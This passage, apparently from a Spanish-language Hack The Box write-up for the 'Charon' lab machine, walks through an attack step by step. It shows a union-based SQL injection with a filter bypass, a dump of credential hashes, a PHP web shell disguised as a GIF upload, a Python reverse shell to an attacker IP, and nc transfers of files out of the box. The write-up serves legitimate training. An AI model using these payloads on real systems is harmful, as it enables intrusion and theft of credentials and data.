+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;sqli_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Email: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;makeRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sqli_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Una vez que tenemos nuestro script, vamos a realizar algunas pruebas.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 sqli_charon.py
+Email: &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;@test.com&lt;span class=&quot;s1&quot;&gt;' order by 100-- -
+[*] Error in Database!    
+Email: test@test.com'&lt;/span&gt; order by 10-- -
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Error &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Database!    
+Email: &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;@test.com&lt;span class=&quot;s1&quot;&gt;' order by 9-- -
+[*] Error in Database!    
+Email: test@test.com'&lt;/span&gt; order by 7-- -
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Error &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Database!    
+Email: &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;@test.com&lt;span class=&quot;s1&quot;&gt;' order by 5-- -
+[*] Error in Database!    
+Email: test@test.com'&lt;/span&gt; order by 4-- -
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; User not found with that email!    
+Email:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Para el valor 4, vemos que la respuesta cambia de &lt;strong&gt;Error in Database&lt;/strong&gt; a &lt;strong&gt;User not found with that email!&lt;/strong&gt;; por lo tanto podríamos pensar que la tabla de la base de datos presenta 4 columnas.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Email: &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;@test.com&lt;span class=&quot;s1&quot;&gt;' union select 1,2,3,4-- -
+[-] Ha ocurrido un error!
+Email:
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Cuando queremos ejecutar la sentencia &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;union select&lt;/code&gt;, vemos que ocurre un error; por lo tanto vamos a ocupar un tipo de evasión ya que se observa que hay palabras o caracteres que al servidor no le gusta.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Email: &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;@test.com&lt;span class=&quot;s1&quot;&gt;' UNion select 1,2,3,4-- -
+[*] Incorrect format    
+Email:
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que al cambiar unas letras a mayúsculas, ya le gusta al servidor; sin embargo, ya no tenemos la respuesta de &lt;strong&gt;User not found with that email!&lt;/strong&gt;; por lo que podrían existir caracteres que no le gustan, pero antes de listar con todas las letras del abecedario, vamos a tratar primero los caracteres especiales.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Email: &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;@test.com&lt;span class=&quot;s1&quot;&gt;' UNion select 1,2,3,&quot;a&quot;-- -
+[*] Error in Database!    
+Email: test@test.com'&lt;/span&gt; UNion &lt;span class=&quot;k&quot;&gt;select &lt;/span&gt;1,2,3,&lt;span class=&quot;s2&quot;&gt;&quot;b&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; -
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Error &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Database!    
+Email: &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;@test.com&lt;span class=&quot;s1&quot;&gt;' UNion select 1,2,3,&quot;c&quot;-- -
+[*] Error in Database!    
+Email:  
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Para hacer un barrido sobre los caracteres especiales, hacremos uso del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/SecLists/Fuzzing/special-chars.txt&lt;/code&gt; (que en caso de no tenerlo, podemos descargar &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;SecLists&lt;/a&gt; y lo guardamos en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/&lt;/code&gt;). Como la respuesta no es la que buscamos, vamos a tratar de hacer combinaciones de caracteres especiales. Pero para este caso vamos a utilizar la herramienta &lt;a href=&quot;https://portswigger.net/burp&quot;&gt;BurpSuite&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-charon/charon-burp.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que la combinación &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.&lt;/code&gt; generan una respuesta &lt;strong&gt;Email sent to:&lt;/strong&gt;, por lo que podriamos pensar que dichos símbolos son necesarios cuando queramos hacer una inyección. Ahora vamos a tratar de obtener el nombre de la base de datos a través del comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;database()&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;concat&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 sqli_charon.py
+Email: &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;@test.com&lt;span class=&quot;s1&quot;&gt;' UNion select 1,2,3,concat(database(),&quot;@.&quot;)-- -
+[*] Email sent to: supercms@.=
+Email:  
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos el nombre de la base de datos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;supercms&lt;/code&gt;; por lo que ya encontramos una forma de dumpear la base de datos.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 sqli_charon.py
+Email: &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;@test.com&lt;span class=&quot;s1&quot;&gt;' UNion select 1,2,3,concat(database(),&quot;@.&quot;)-- -
+[*] Email sent to: supercms@.=
+Email: test@test.com'&lt;/span&gt; UNion &lt;span class=&quot;k&quot;&gt;select &lt;/span&gt;1,2,3,concat&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;user&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;@.&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; -
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Email sent to: supercms@localhost@.&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+Email: &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;@test.com&lt;span class=&quot;s1&quot;&gt;' UNion select 1,2,3,concat(table_name,&quot;@.&quot;) from information_schema.tables where table_schema=&quot;supercms&quot; limit 1,1-- -
+[*] Email sent to: license@.=
+Email: test@test.com'&lt;/span&gt; UNion &lt;span class=&quot;k&quot;&gt;select &lt;/span&gt;1,2,3,concat&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;table_name,&lt;span class=&quot;s2&quot;&gt;&quot;@.&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; from information_schema.tables where &lt;span class=&quot;nv&quot;&gt;table_schema&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;supercms&quot;&lt;/span&gt; limit 2,1-- -
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Email sent to: operators@.&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+Email: &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;@test.com&lt;span class=&quot;s1&quot;&gt;' UNion select 1,2,3,concat(table_name,&quot;@.&quot;) from information_schema.tables where table_schema=&quot;supercms&quot; limit 3,1-- -
+[*] User not found with that email!    
+Email: 
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya tenemos las tablas que componen la base de datos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;supercms&lt;/code&gt; que son &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;license&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;operators&lt;/code&gt;. Aqui ya nos llama más la atención la segunda tabla, así que vamos a listar las columnas de dicha tabla:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Email: &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;@test.com&lt;span class=&quot;s1&quot;&gt;' UNion select 1,2,3,concat(column_name,&quot;@.&quot;) from information_schema.columns where table_name=&quot;operators&quot; limit 1,1-- -
+[*] Email sent to: __username_@.=
+Email: test@test.com'&lt;/span&gt; UNion &lt;span class=&quot;k&quot;&gt;select &lt;/span&gt;1,2,3,concat&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;column_name,&lt;span class=&quot;s2&quot;&gt;&quot;@.&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; from information_schema.columns where &lt;span class=&quot;nv&quot;&gt;table_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;operators&quot;&lt;/span&gt; limit 2,1-- -
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Email sent to: __password_@.&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+Email: &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;@test.com&lt;span class=&quot;s1&quot;&gt;' UNion select 1,2,3,concat(column_name,&quot;@.&quot;) from information_schema.columns where table_name=&quot;operators&quot; limit 3,1-- -
+[*] Email sent to: email@.=
+Email: test@test.com'&lt;/span&gt; UNion &lt;span class=&quot;k&quot;&gt;select &lt;/span&gt;1,2,3,concat&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;column_name,&lt;span class=&quot;s2&quot;&gt;&quot;@.&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; from information_schema.columns where &lt;span class=&quot;nv&quot;&gt;table_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;operators&quot;&lt;/span&gt; limit 4,1-- -
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; User not found with that email!    
+Email:  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya tenemos las columnas de la tabla &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;operators&lt;/code&gt;, las cuales son: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__username_&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__password_&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;email&lt;/code&gt;. Por lo tanto, lo que nos queda es listar los datos de dichas columnas.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Email sent to: test51:5f4dcc3b5aa765d61d8327deb882cf99@.&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+Email: &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;@test.com&lt;span class=&quot;s1&quot;&gt;' UNion select 1,2,3,concat(__username_,0x3a,__password_,&quot;@.&quot;) from operators limit 100,1-- -
+[*] Email sent to: test101:5f4dcc3b5aa765d61d8327deb882cf99@.=
+Email: test@test.com'&lt;/span&gt; UNion &lt;span class=&quot;k&quot;&gt;select &lt;/span&gt;1,2,3,concat&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;__username_,0x3a,__password_,&lt;span class=&quot;s2&quot;&gt;&quot;@.&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; from operators limit 200,1-- -
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Email sent to: super_cms_adm:0b0689ba94f94533400f4decd87fa260@.&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+Email:
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos varios usuarios, pero ya tenemos uno que nos debe llamar mucho la atención: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;super_cms_adm&lt;/code&gt; y tenemos su contraseña hasheada; por lo que vamos a crackearla con la herramienta online &lt;a href=&quot;https://crackstation.net/&quot;&gt;crackstation&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-charon/charon-hash.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ya tenemos unas credenciales a probar, así que validaremos en el panel de login (&lt;strong&gt;Nota&lt;/strong&gt;: Simpre guardar las credenciales que vayamos encontrando):&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-charon/charon-web6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Aqui algo que ya nos llama la atención es que podemos super archivos y en específico, imágenes.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-charon/charon-web7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vamos a tratar de subir un archivo php el cual nos ayude a ejecutar comandos a nivel de sistema.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;pre&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;/pre&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-charon/charon-web8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vamos a cambiar la cabezara de nuestro archivo para que sea considerado como un GIF.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GIF8;
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;pre&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;/pre&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Pero vemos que nos sigue mandanlo lo mismo, por lo que cambiaremos la extensión de nuestro archivo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-charon/charon-web9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que nuestro archivo se sube en la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/images/&lt;/code&gt;; sin embargo, no presenta la extensión php que necesitamos para poder ejecutar comandos. Si le echamos un ojo al código fuente del sitio, vemos un campo que se encuentra comentado.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-charon/charon-web10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vamos a descomentar el campo y modificar el tipo. Además, podemos ver que el nombre está medio raro, como que está en base64, por lo que vamos a descifrarlo.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;dGVzdGZpbGUx&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo
+&lt;/span&gt;testfile1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que el nombre es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;testfile1&lt;/code&gt;, por lo que vamos a cambiar lo que está en base64 por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;testfile1&lt;/code&gt;, quedando de la siguiente forma:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-charon/charon-web11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora vamos a tratar de subir un archivo nuevamente &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell.gif&lt;/code&gt; y vamos a agregar algo en el nuevo campo que tenemos, por ejemplo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-charon/charon-web12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y vemos que con dicho campo podemos modificar el nombre del archivo, por lo tanto podríamos subir nuevamente nuestra shell &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell.gif&lt;/code&gt; y aprovechando el campo para cambiar la extensión.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-charon/charon-web13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora vamos a validar en la ruta que se nos indica &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/images/shell.php&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-charon/charon-web14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ya logramos ejecución de comandos a nivel de sistema, así que ahora nos queda es entablarnos una reverse shell, por lo que nos ponemos en escucha a través del puerto 443.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.10.31/images/shell.php?cmd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.27&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.31] 56646
+/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
+$ whoami
+www-data
+$ 
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya estamos dentro de la máquina, así que primero vamos a realizar un &lt;a href=&quot;/tratamiento-tty&quot;&gt;Tratamiento de la tty&lt;/a&gt; para trabajar más cómodos. Vemos que no podemos visualizar la primera flag, así que vamos a enumerar un poco para ver la forma de migrar a otro usuario o escalar privilegios.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@charon:/home/decoder&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+total 12
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 decoder freeeze 138 Jun 23  2017 decoder.pub
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 decoder freeeze  32 Jun 23  2017 pass.crypt
+&lt;span class=&quot;nt&quot;&gt;-r--------&lt;/span&gt; 1 decoder freeeze  33 Jun 23  2017 user.txt
+www-data@charon:/home/decoder&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Dentro del directorio del usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;decoder&lt;/code&gt;, vemos algunos archivos los cuales podemos ver el contenido que son &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;decoder.pub&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pass.crypt&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@charon:/home/decoder&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;decoder.pub 
+&lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; PUBLIC KEY-----
+MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhALxHhYGPVMYmx3vzJbPPAEa10NETXrV3
+&lt;span class=&quot;nv&quot;&gt;mI9wJizmFJhrAgMBAAE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; PUBLIC KEY-----
+www-data@charon:/home/decoder&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;pass.crypt &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo
+&lt;/span&gt;2OSb&lt;span class=&quot;s2&quot;&gt;&quot;eWgTo7I
+www-data@charon:/home/decoder&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Lo que haremos primero será transferirnos los archivos a nuestra máquina.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@charon:/home/decoder&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc 10.10.14.27 443 &amp;lt; decoder.pub 
+www-data@charon:/home/decoder&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc 10.10.14.27 443 &amp;lt; pass.crypt  
+www-data@charon:/home/decoder&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;md5sum &lt;/span&gt;decoder.pub 
+afcb9745eb5e553d7b15077363878c1b  decoder.pub
+www-data@charon:/home/decoder&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;md5sum &lt;/span&gt;pass.crypt 
+ade0dc6187e2fa671c1d7a02d3c9f737  pass.crypt
+www-data@charon:/home/decoder&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
